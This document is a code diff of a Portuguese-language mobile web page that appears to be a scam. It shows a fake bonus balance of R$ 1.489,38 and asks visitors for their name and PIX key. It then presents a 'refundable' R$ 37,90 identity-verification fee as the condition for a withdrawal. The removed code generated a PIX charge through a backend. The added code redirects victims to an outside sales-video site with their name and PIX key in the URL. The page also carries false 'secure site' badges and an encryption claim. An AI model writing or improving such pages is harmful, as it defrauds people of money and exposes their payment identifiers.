@@ -3,49 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Confirmação de Identidade</title>
+    <title>Verificação de Segurança</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
     <style>
-        /* --- RESET E BASE --- */
+        /* --- ESTILOS GERAIS (PREMIUM) --- */
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            background: #f4f7fa; 
-            margin: 0; 
-            padding: 0; 
-            color: #2d3436; 
-        }
-        
-        /* Utilitários */
+        body { font-family: 'Roboto', sans-serif; background: #f4f7fa; margin: 0; padding: 0; color: #2d3436; }
         .hidden { display: none !important; }
         .fade-in { animation: fadeIn 0.4s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* --- TELA 1: DASHBOARD --- */
+        /* --- TELA 1: DASHBOARD PREMIUM --- */
         .header-section { 
             background: linear-gradient(145deg, #ff6b4a 0%, #ff472e 100%);
-            padding: 35px 25px 50px 25px;
-            color: white; 
-            border-radius: 0 0 30px 30px; 
-            box-shadow: 0 15px 30px rgba(255, 71, 46, 0.25);
-            position: relative;
-            overflow: hidden;
+            padding: 35px 25px 50px 25px; color: white; border-radius: 0 0 30px 30px; 
+            box-shadow: 0 15px 30px rgba(255, 71, 46, 0.25); position: relative; overflow: hidden;
         }
         .header-section::before {
             content: ''; position: absolute; top: -50%; left: -20%; width: 200%; height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
-            pointer-events: none;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%); pointer-events: none;
         }
         .label-saldo { font-size: 15px; opacity: 0.9; letter-spacing: 0.5px; }
         .valor-grande-container { display: flex; align-items: center; gap: 15px; margin-top: 10px; }
         .valor-grande { font-size: 46px; font-weight: 900; letter-spacing: -1px; line-height: 1; }
+        
         .premium-coin {
-            width: 54px; height: 54px;
-            background: linear-gradient(135deg, #FFD700 0%, #FF8C00 100%);
-            border-radius: 50%;
-            box-shadow: inset 0 2px 3px rgba(255,255,255,0.5), inset 0 -2px 3px rgba(0,0,0,0.1), 0 8px 20px rgba(255, 140, 0, 0.3);
-            display: flex; align-items: center; justify-content: center;
-            position: relative;
+            width: 54px; height: 54px; background: linear-gradient(135deg, #FFD700 0%, #FF8C00 100%);
+            border-radius: 50%; box-shadow: inset 0 2px 3px rgba(255,255,255,0.5), inset 0 -2px 3px rgba(0,0,0,0.1), 0 8px 20px rgba(255, 140, 0, 0.3);
+            display: flex; align-items: center; justify-content: center; position: relative;
         }
         .coin-symbol { font-size: 28px; font-weight: 900; color: #FFF; text-shadow: 0 1px 2px rgba(0,0,0,0.2); }
         .premium-coin::after {
@@ -55,54 +40,38 @@
         .pontos-text { font-size: 13px; margin-top: 10px; opacity: 0.85; font-weight: 500; }
 
         .container { padding: 0 24px 40px 24px; max-width: 500px; margin: 0 auto; margin-top: -35px; position: relative; z-index: 10; }
-        
         .status-bar {
-            background: white; padding: 15px; border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.06); margin-bottom: 25px;
-            display: flex; align-items: center; gap: 12px; font-size: 13px; color: #555; font-weight: 500;
+            background: white; padding: 15px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.06); 
+            margin-bottom: 25px; display: flex; align-items: center; gap: 12px; font-size: 13px; color: #555; font-weight: 500;
         }
         .status-icon { width: 24px; height: 24px; background: #e3fcef; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #00b894; flex-shrink: 0; }
-
-        .card-white { 
-            background: white; border-radius: 24px; padding: 25px; 
-            box-shadow: 0 12px 40px rgba(0,0,0,0.04); margin-bottom: 25px;
-            border: 1px solid rgba(0,0,0,0.03);
-        }
+        .card-white { background: white; border-radius: 24px; padding: 25px; box-shadow: 0 12px 40px rgba(0,0,0,0.04); margin-bottom: 25px; border: 1px solid rgba(0,0,0,0.03); }
         
-        /* Botões da Tela 1 */
         .options-grid { display: flex; gap: 10px; margin-bottom: 12px; }
         .option-btn { flex: 1; padding: 15px 0; background: white; border: 2px solid #edf2f7; border-radius: 14px; text-align: center; font-weight: 700; color: #2d3436; cursor: pointer; transition: 0.2s; }
         .big-option { width: 100%; padding: 20px 0; background: white; border: 2px solid #edf2f7; border-radius: 14px; text-align: center; cursor: pointer; margin-bottom: 20px; display: flex; flex-direction: column; align-items: center; }
         .selected { border-color: #ff472e !important; background: #fff5f3 !important; color: #ff472e !important; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,71,46,0.15); }
-        
         .btn-main { width: 100%; background: #dfe6e9; color: #b2bec3; border: none; padding: 18px; border-radius: 14px; font-size: 16px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; cursor: not-allowed; transition: 0.3s; }
         .btn-main.active { background: linear-gradient(to right, #ff6b4a, #ff472e); color: white; cursor: pointer; box-shadow: 0 8px 25px rgba(255,71,46,0.3); }
-        .btn-main.active:active { transform: scale(0.98); }
-
+        
         /* --- TELA 2: MODAL --- */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); z-index: 100; display: flex; align-items: flex-end; }
         .modal-sheet { background: white; width: 100%; border-radius: 30px 30px 0 0; padding: 30px 25px 45px 25px; animation: slideUp 0.3s ease-out; }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        
         .pix-selector { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin: 8px 0 20px 0; }
         .pix-type-btn { background: #f1f2f6; border: 1px solid transparent; padding: 10px 0; border-radius: 8px; font-size: 11px; font-weight: 700; color: #636e72; cursor: pointer; }
         .pix-type-btn.active-type { background: #fff5f3; color: #ff472e; border-color: #ff472e; }
-        
         input { width: 100%; padding: 16px; border: 2px solid #edf2f7; border-radius: 12px; font-size: 16px; outline: none; transition: 0.3s; color: #2d3436; margin-top: 5px; }
         input:focus { border-color: #ff472e; background: white; }
         label { font-size: 12px; font-weight: 700; color: #636e72; text-transform: uppercase; letter-spacing: 0.5px; }
         .input-group { margin-bottom: 15px; }
 
-        /* --- TELA 3: CONFIRMAÇÃO (NOVO DESIGN) --- */
-        .confirm-header {
-            background: white; border-radius: 20px; padding: 25px; margin-bottom: 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.03); border-left: 5px solid #ff472e;
-        }
+        /* --- TELA 3: CONFIRMAÇÃO --- */
+        .confirm-header { background: white; border-radius: 20px; padding: 25px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.03); border-left: 5px solid #ff472e; }
         .confirm-title { font-size: 14px; font-weight: 800; color: #555; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px; }
         .confirm-value { font-size: 36px; font-weight: 900; color: #ff472e; display: flex; align-items: center; gap: 10px; }
         .badge-reembolso { background: #e3fcef; color: #00b894; font-size: 10px; padding: 4px 8px; border-radius: 4px; font-weight: 800; vertical-align: middle; letter-spacing: 0.5px; text-transform: uppercase; }
         .confirm-desc { font-size: 13px; color: #666; line-height: 1.5; margin-top: 10px; }
-
         .data-box { background: white; border-radius: 20px; overflow: hidden; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.03); }
         .data-header { background: #f8f9fa; padding: 15px 20px; font-size: 13px; font-weight: 800; color: #555; border-bottom: 1px solid #eee; text-transform: uppercase; }
         .data-row { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid #f5f5f5; font-size: 14px; }
@@ -110,31 +79,21 @@
         .data-label { color: #999; font-weight: 500; }
         .data-val { color: #333; font-weight: 700; text-align: right; }
         .val-total { color: #2d3436; font-size: 16px; font-weight: 900; }
-
-        /* Timeline Processo */
         .process-box { background: white; border-radius: 20px; padding: 25px; margin-bottom: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.03); }
-        .process-title { font-size: 13px; font-weight: 800; color: #555; text-transform: uppercase; margin-bottom: 20px; }
         .step-item { display: flex; gap: 15px; margin-bottom: 20px; position: relative; }
         .step-item:last-child { margin-bottom: 0; }
-        /* Linha conectora */
         .step-item:not(:last-child)::after { content: ''; position: absolute; top: 30px; left: 14px; width: 2px; height: calc(100% - 10px); background: #eee; }
-        
         .step-icon { width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; z-index: 2; flex-shrink: 0; }
         .icon-orange { background: #fff5f3; color: #ff472e; border: 2px solid #ff472e; }
         .icon-green { background: #e3fcef; color: #00b894; border: 2px solid #00b894; }
         .icon-gray { background: #f1f2f6; color: #b2bec3; border: 2px solid #dfe6e9; }
-        
         .step-content h4 { margin: 0 0 4px 0; font-size: 14px; font-weight: 800; color: #333; }
         .step-content p { margin: 0; font-size: 12px; color: #888; }
-
         .timer-tag { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: #00b894; font-weight: 700; margin-top: 15px; }
-
-        /* Rodapé de Segurança Global */
         .footer-badges { display: flex; justify-content: center; gap: 15px; margin-top: 30px; flex-wrap: wrap; }
         .badge-item { display: flex; flex-direction: column; align-items: center; gap: 5px; opacity: 0.7; }
         .badge-icon { width: 35px; height: 35px; background: #e0e0e0; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #555; }
         .badge-text { font-size: 10px; color: #888; text-transform: uppercase; font-weight: 700; }
-
     </style>
 </head>
 <body>
@@ -148,40 +107,28 @@
             </div>
             <div class="pontos-text">+<span id="points-counter">0</span> pontos acumulados hoje</div>
         </div>
-
         <div class="container">
             <div class="status-bar">
                 <div class="status-icon">✓</div>
                 <span>Sua última bonificação de R$ 845,24 foi processada.</span>
             </div>
-
             <div class="card-white">
                 <h3 style="font-size: 18px; font-weight: 800; margin-bottom: 20px; color: #2d3436;">Solicitar Retirada</h3>
                 <p style="font-size: 14px; color: #888; margin-bottom: 15px;">Selecione o valor para transferência:</p>
-
                 <div class="options-grid">
                     <div class="option-btn" onclick="selectItem(this, 1.5)">R$ 1,50</div>
                     <div class="option-btn" onclick="selectItem(this, 5.0)">R$ 5,00</div>
                     <div class="option-btn" onclick="selectItem(this, 10.0)">R$ 10,00</div>
                 </div>
-
                 <div class="big-option" onclick="selectItem(this, 1489.38)">
                     <span style="font-size: 26px; font-weight: 900; color: #2d3436;">R$ 1.489,38</span>
                     <span style="font-size: 12px; color: #00b894; font-weight: 700; text-transform: uppercase; margin-top: 5px;">Saldo Remanescente</span>
                 </div>
-
                 <button id="btn-dashboard" class="btn-main" onclick="openModal()">SELECIONE UM VALOR</button>
             </div>
-            
             <div class="footer-badges">
-                <div class="badge-item">
-                    <div class="badge-icon">🔒</div>
-                    <span class="badge-text">Site Seguro</span>
-                </div>
-                <div class="badge-item">
-                    <div class="badge-icon">🛡️</div>
-                    <span class="badge-text">Blindado</span>
-                </div>
+                <div class="badge-item"><div class="badge-icon">🔒</div><span class="badge-text">Site Seguro</span></div>
+                <div class="badge-item"><div class="badge-icon">🛡️</div><span class="badge-text">Blindado</span></div>
             </div>
         </div>
     </div>
@@ -192,12 +139,10 @@
                 <h2 style="margin: 0; font-size: 18px; font-weight: 800; color: #2d3436;">Dados de Recebimento</h2>
                 <span onclick="closeModal()" style="font-size: 28px; color: #999; cursor: pointer;">&times;</span>
             </div>
-            
             <div class="input-group">
                 <label>Nome do Titular</label>
                 <input type="text" id="input-nome" placeholder="Nome completo">
             </div>
-            
             <div class="input-group">
                 <label>Tipo de Chave:</label>
                 <div class="pix-selector">
@@ -208,109 +153,51 @@
                 </div>
                 <input type="tel" id="input-chave" placeholder="000.000.000-00" oninput="maskInput(this)">
             </div>
-
             <button class="btn-main active" onclick="goToConfirmation()">CONFIRMAR DADOS</button>
         </div>
     </div>
 
     <div id="screen-confirmation" class="hidden fade-in" style="padding: 20px; max-width: 500px; margin: 0 auto;">
-        
         <div class="confirm-header">
-            <div class="confirm-title">CONFIRMAÇÃO DE IDENTIDADE</div>
-            <div class="confirm-value">
-                R$ 37,90 
-                <span class="badge-reembolso">VALOR REEMBOLSÁVEL</span>
-            </div>
-            <p class="confirm-desc">
-                Taxa obrigatória para liberação do bônus. O valor de <strong>R$ 37,90</strong> será reembolsado integralmente para você em 1 minuto junto com seu saque.
-            </p>
+            <div class="confirm-title">VERIFICAÇÃO DE IDENTIDADE</div>
+            <div class="confirm-value">R$ 37,90 <span class="badge-reembolso">VALOR REEMBOLSÁVEL</span></div>
+            <p class="confirm-desc">Taxa de verificação. O valor de <strong>R$ 37,90</strong> será reembolsado integralmente para você em 1 minuto junto com seu saque.</p>
         </div>
 
         <div class="data-box">
-            <div class="data-header">DADOS PARA REEMBOLSO</div>
-            <div class="data-row">
-                <span class="data-label">Nome</span>
-                <span class="data-val" id="resumo-nome">Carregando...</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Data</span>
-                <span class="data-val" id="resumo-data">12/02/2026</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Chave PIX</span>
-                <span class="data-val" id="resumo-chave">...</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Valor a receber</span>
-                <span class="val-total">R$ 1.489,38</span>
-            </div>
+            <div class="data-header">DADOS PARA ESTORNO</div>
+            <div class="data-row"><span class="data-label">Nome</span><span class="data-val" id="resumo-nome">...</span></div>
+            <div class="data-row"><span class="data-label">Data</span><span class="data-val" id="resumo-data">...</span></div>
+            <div class="data-row"><span class="data-label">Chave PIX</span><span class="data-val" id="resumo-chave">...</span></div>
+            <div class="data-row"><span class="data-label">Valor a receber</span><span class="val-total">R$ 1.489,38</span></div>
         </div>
 
         <div class="process-box">
             <div class="process-title">PROCESSO DE LIBERAÇÃO</div>
+            <div class="step-item"><div class="step-icon icon-orange">1</div><div class="step-content"><h4>Verificação de Identidade</h4><p>Confirmação rápida</p></div></div>
+            <div class="step-item"><div class="step-icon icon-green">✓</div><div class="step-content"><h4 style="color: #00b894;">Estorno automático</h4><p>Valor devolvido em 1 min</p></div></div>
+            <div class="step-item"><div class="step-icon icon-gray">3</div><div class="step-content"><h4>Saldo liberado</h4><p>R$ 1.489,38 na conta</p></div></div>
             
-            <div class="step-item">
-                <div class="step-icon icon-orange">1</div>
-                <div class="step-content">
-                    <h4>Pagar taxa de confirmação</h4>
-                    <p>Para verificação de identidade</p>
-                </div>
-            </div>
-
-            <div class="step-item">
-                <div class="step-icon icon-green">✓</div>
-                <div class="step-content">
-                    <h4 style="color: #00b894;">Receber reembolso automático</h4>
-                    <p>Valor devolvido em 1 minuto</p>
-                </div>
-            </div>
-
-            <div class="step-item">
-                <div class="step-icon icon-gray">3</div>
-                <div class="step-content">
-                    <h4>Acessar saldo completo</h4>
-                    <p>R$ 1.489,38 liberado para saque</p>
-                </div>
-            </div>
-
-            <button class="btn-main active" style="margin-top: 25px; background: #ff472e; box-shadow: 0 10px 30px rgba(255, 71, 46, 0.4);" onclick="processPayment()">
-                PAGAR TAXA PARA LIBERAR SAQUE
+            <button class="btn-main active" style="margin-top: 25px; background: #ff472e; box-shadow: 0 10px 30px rgba(255, 71, 46, 0.4);" onclick="redirectToVSL()">
+                CONCLUIR VERIFICAÇÃO
             </button>
-
-            <div class="timer-tag">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-                Reembolso automático em 1 minuto
-            </div>
+            <div class="timer-tag"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Estorno automático em 1 minuto</div>
         </div>
 
         <div class="footer-badges">
-            <div class="badge-item">
-                <div class="badge-icon" style="color: #00b894; background: #e3fcef;">🛡️</div>
-                <span class="badge-text">Garantia de<br>Estorno</span>
-            </div>
-            <div class="badge-item">
-                <div class="badge-icon" style="color: #0984e3; background: #e3f2fd;">🔒</div>
-                <span class="badge-text">Compra<br>Segura</span>
-            </div>
-            <div class="badge-item">
-                <div class="badge-icon" style="color: #6c5ce7; background: #ede7f6;">✨</div>
-                <span class="badge-text">Satisfação<br>Garantida</span>
-            </div>
+            <div class="badge-item"><div class="badge-icon" style="color: #00b894; background: #e3fcef;">🛡️</div><span class="badge-text">Garantia de<br>Estorno</span></div>
+            <div class="badge-item"><div class="badge-icon" style="color: #0984e3; background: #e3f2fd;">🔒</div><span class="badge-text">Ambiente<br>Seguro</span></div>
         </div>
-        
-        <p style="text-align: center; font-size: 10px; color: #aaa; margin-top: 20px; line-height: 1.5;">
-            Este pagamento é processado por uma instituição financeira autorizada. Seus dados estão protegidos por criptografia de ponta a ponta.
-        </p>
-
+        <p style="text-align: center; font-size: 10px; color: #aaa; margin-top: 20px; line-height: 1.5;">Seus dados estão protegidos por criptografia de ponta a ponta.</p>
     </div>
 
     <script>
         // CONFIGURAÇÃO
-        const API_BASE = ""; 
+        const LINK_DA_VSL = "https://recuperabonushopp.com/elementor-1623";
         let currentPixType = 'cpf';
         let valorSelecionado = 0;
 
-        // --- 1. FUNÇÕES DA TELA 1 (DASHBOARD) ---
+        // TELA 1
         function animateValue(id, start, end, duration) {
             const obj = document.getElementById(id);
             if(!obj) return;
@@ -318,12 +205,9 @@
             const step = (timestamp) => {
                 if (!startTimestamp) startTimestamp = timestamp;
                 const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                const easeOutProgress = 1 - Math.pow(1 - progress, 3);
-                let currentVal = easeOutProgress * (end - start) + start;
-                
+                let currentVal = progress * (end - start) + start;
                 if (id === "counter") obj.innerHTML = currentVal.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 else obj.innerHTML = Math.floor(currentVal).toLocaleString('pt-BR');
-
                 if (progress < 1) window.requestAnimationFrame(step);
                 else {
                     if (id === "counter") obj.innerHTML = end.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
@@ -332,7 +216,6 @@
             };
             window.requestAnimationFrame(step);
         }
-
         function selectItem(el, val) {
             document.querySelectorAll('.option-btn, .big-option').forEach(b => b.classList.remove('selected'));
             el.classList.add('selected');
@@ -341,112 +224,57 @@
             btn.classList.add('active');
             btn.innerText = "SACAR R$ " + val.toLocaleString('pt-BR', {minimumFractionDigits: 2});
         }
-
         function openModal() {
             if(valorSelecionado === 0) return alert("Selecione um valor primeiro.");
             document.getElementById('modal-dados').classList.remove('hidden');
         }
-        function closeModal() {
-            document.getElementById('modal-dados').classList.add('hidden');
-        }
+        function closeModal() { document.getElementById('modal-dados').classList.add('hidden'); }
 
-        // --- 2. FUNÇÕES DA TELA 2 (MODAL) ---
+        // TELA 2
         function setPixType(type, btn) {
             currentPixType = type;
             document.querySelectorAll('.pix-type-btn').forEach(b => b.classList.remove('active-type'));
             btn.classList.add('active-type');
-            
             const input = document.getElementById('input-chave');
-            input.value = "";
-            input.focus();
-            
+            input.value = ""; input.focus();
             if(type === 'cpf') input.placeholder = "000.000.000-00";
             else if(type === 'telefone') input.placeholder = "(00) 00000-0000";
             else if(type === 'email') input.placeholder = "seu@email.com";
-            else input.placeholder = "Cole sua chave aleatória";
+            else input.placeholder = "Cole sua chave";
         }
-
         function maskInput(i) {
             let v = i.value;
-            if(currentPixType === 'cpf') {
-                v = v.replace(/\D/g, "").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
-            } else if(currentPixType === 'telefone') {
-                v = v.replace(/\D/g, "").replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
-            }
+            if(currentPixType === 'cpf') v = v.replace(/\D/g, "").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            else if(currentPixType === 'telefone') v = v.replace(/\D/g, "").replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
             i.value = v;
         }
-
-        // --- 3. TRANSIÇÃO PARA TELA 3 (CONFIRMAÇÃO) ---
         function goToConfirmation() {
             const nome = document.getElementById('input-nome').value.trim();
             const chave = document.getElementById('input-chave').value.trim();
-
             if(nome.length < 3 || chave.length < 5) return alert("Preencha os dados corretamente.");
-
-            // Preenche os dados na tela 3
             document.getElementById('resumo-nome').innerText = nome;
             document.getElementById('resumo-chave').innerText = chave;
-            
-            // Pega data de hoje
-            const hoje = new Date();
-            document.getElementById('resumo-data').innerText = hoje.toLocaleDateString('pt-BR');
-
-            // Troca de tela
+            document.getElementById('resumo-data').innerText = new Date().toLocaleDateString('pt-BR');
             document.getElementById('modal-dados').classList.add('hidden');
             document.getElementById('screen-dashboard').classList.add('hidden');
             document.getElementById('screen-confirmation').classList.remove('hidden');
-            
-            // Rola para o topo
             window.scrollTo(0,0);
         }
 
-        // --- 4. PAGAMENTO FINAL ---
-        async function processPayment() {
+        // TELA 3 - REDIRECIONAMENTO COM DADOS
+        function redirectToVSL() {
             const btn = document.querySelector('#screen-confirmation button');
-            const originalText = btn.innerText;
-            btn.innerText = "GERANDO PIX...";
-            btn.disabled = true;
-
+            btn.innerText = "CARREGANDO...";
             const nome = document.getElementById('resumo-nome').innerText;
             const chave = document.getElementById('resumo-chave').innerText;
-
-            try {
-                // Chama seu Backend no Render
-                const response = await fetch(`${API_BASE}/pix`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        amount: 37.90,
-                        name: nome,
-                        cpf: chave, // Envia a chave como identificador
-                        email: "cliente@email.com"
-                    })
-                });
-
-                const data = await response.json();
-
-                if (response.ok && data.point_of_interaction) {
-                    // SUCESSO! Redireciona para o Mercado Pago
-                    window.location.href = data.point_of_interaction.transaction_data.ticket_url;
-                } else {
-                    alert("Erro ao gerar Pix: " + (data.message || "Tente novamente."));
-                    btn.innerText = originalText;
-                    btn.disabled = false;
-                }
-
-            } catch (error) {
-                alert("Erro de conexão. Verifique sua internet.");
-                btn.innerText = originalText;
-                btn.disabled = false;
-            }
+            // Envia os dados via URL para a VSL
+            window.location.href = `${LINK_DA_VSL}?nome=${encodeURIComponent(nome)}&chave=${encodeURIComponent(chave)}&tipo=${currentPixType}`;
         }
 
-        // START
         document.addEventListener("DOMContentLoaded", () => {
             animateValue("counter", 0, 1489.38, 2000);
             animateValue("points-counter", 0, 42583, 2000);
         });
-
     </script>
 </body>
 </html>
